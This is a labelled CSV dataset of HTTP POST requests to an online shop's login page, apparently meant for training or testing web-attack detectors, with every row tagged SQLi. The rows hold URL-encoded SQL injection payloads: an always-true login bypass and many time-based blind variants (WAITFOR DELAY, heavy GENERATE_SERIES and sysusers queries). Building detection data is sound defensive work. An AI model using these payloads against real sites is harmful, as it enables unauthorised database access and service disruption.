,id,method,path,query,label
90,10090,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%288469%3D8469,SQLi
91,10091,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%284953%3D4953,SQLi
92,10092,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%289359%3D9359,SQLi
93,10093,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--,SQLi
94,10094,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%27Dplv%27%3D%27Dplv,SQLi
95,10095,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%27lGgV%27%3D%27lGgV,SQLi
96,10096,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%28%27LFYl%27%3D%27LFYl,SQLi
97,10097,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%27mbox%27%3D%27mbox,SQLi
98,10098,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%27kQOF%27%20LIKE%20%27kQOF,SQLi
99,10099,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%27DSmZ%27%20LIKE%20%27DSmZ,SQLi
100,10100,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%28%27lzVN%27%20LIKE%20%27lzVN,SQLi
101,10101,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%27XntW%27%20LIKE%20%27XntW,SQLi
102,10102,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%22fNvd%22%3D%22fNvd,SQLi
103,10103,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%22LhrN%22%3D%22LhrN,SQLi
104,10104,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%28%22mHWg%22%3D%22mHWg,SQLi
105,10105,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%22QfGv%22%3D%22QfGv,SQLi
106,10106,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%22FMTI%22%20LIKE%20%22FMTI,SQLi
107,10107,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%22Ghsb%22%20LIKE%20%22Ghsb,SQLi
108,10108,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%28%28%28%22HKiT%22%20LIKE%20%22HKiT,SQLi
109,10109,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--%20AND%20%22JPIA%22%20LIKE%20%22JPIA,SQLi
110,10110,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,SQLi
111,10111,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,SQLi
112,10112,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,SQLi
113,10113,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,SQLi
114,10114,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28207%3D207,SQLi
115,10115,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28803%3D803,SQLi
116,10116,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%282072%3D2072,SQLi
117,10117,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20WAITFOR%20DELAY%20%270%3A0%3A5%27--,SQLi
118,10118,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%27rBhq%27%3D%27rBhq,SQLi
119,10119,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%27TcHD%27%3D%27TcHD,SQLi
120,10120,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%28%27bAMX%27%3D%27bAMX,SQLi
121,10121,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%27Zkej%27%3D%27Zkej,SQLi
122,10122,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%27tMUx%27%20LIKE%20%27tMUx,SQLi
123,10123,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%27wnsk%27%20LIKE%20%27wnsk,SQLi
124,10124,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%28%27XRpU%27%20LIKE%20%27XRpU,SQLi
125,10125,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%27lHxv%27%20LIKE%20%27lHxv,SQLi
126,10126,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%22fPTK%22%3D%22fPTK,SQLi
127,10127,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%22eePR%22%3D%22eePR,SQLi
128,10128,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%28%22weHG%22%3D%22weHG,SQLi
129,10129,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%22MFBe%22%3D%22MFBe,SQLi
130,10130,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%22OFjZ%22%20LIKE%20%22OFjZ,SQLi
131,10131,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%22jpAG%22%20LIKE%20%22jpAG,SQLi
132,10132,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%28%28%28%22lBVg%22%20LIKE%20%22lBVg,SQLi
133,10133,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20AND%20%22uTwX%22%20LIKE%20%22uTwX,SQLi
134,10134,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29,SQLi
135,10135,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29,SQLi
136,10136,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29,SQLi
137,10137,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29,SQLi
138,10138,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%282244%3D2244,SQLi
139,10139,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%286270%3D6270,SQLi
140,10140,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%288439%3D8439,SQLi
141,10141,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29,SQLi
142,10142,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%27inDd%27%3D%27inDd,SQLi
143,10143,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%27slpj%27%3D%27slpj,SQLi
144,10144,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%28%27Pszd%27%3D%27Pszd,SQLi
145,10145,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%27Acvj%27%3D%27Acvj,SQLi
146,10146,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%27IOHw%27%20LIKE%20%27IOHw,SQLi
147,10147,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%27eZeQ%27%20LIKE%20%27eZeQ,SQLi
148,10148,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%28%27zcCp%27%20LIKE%20%27zcCp,SQLi
149,10149,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%27WmUu%27%20LIKE%20%27WmUu,SQLi
150,10150,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%22RayF%22%3D%22RayF,SQLi
151,10151,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%22JXDc%22%3D%22JXDc,SQLi
152,10152,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%28%22bEat%22%3D%22bEat,SQLi
153,10153,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%22uZjh%22%3D%22uZjh,SQLi
154,10154,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%22uvLr%22%20LIKE%20%22uvLr,SQLi
155,10155,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%22ubYs%22%20LIKE%20%22ubYs,SQLi
156,10156,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%28%28%28%22qgvg%22%20LIKE%20%22qgvg,SQLi
157,10157,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%209644%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29%20AND%20%22wpHz%22%20LIKE%20%22wpHz,SQLi
158,10158,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%205069%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29--,SQLi
159,10159,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%205069%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29--,SQLi
160,10160,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%205069%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29--,SQLi
161,10161,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%205069%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29--,SQLi
162,10162,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%205069%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29--%20AND%20%285157%3D5157,SQLi
163,10163,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20AND%205069%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29--%20AND%20%28%282791%3D2791,SQLi
164,10164,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20AND%205069%3D%28SELECT%20COUNT%28%2A%29%20FROM%20sysusers%20AS%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20AS%20sys4%2Csysusers%20AS%20sys5%2Csysusers%20AS%20sys6%2Csysusers%20AS%20sys7%29--%20AND%20%28%28%281076%3D1076,SQLi
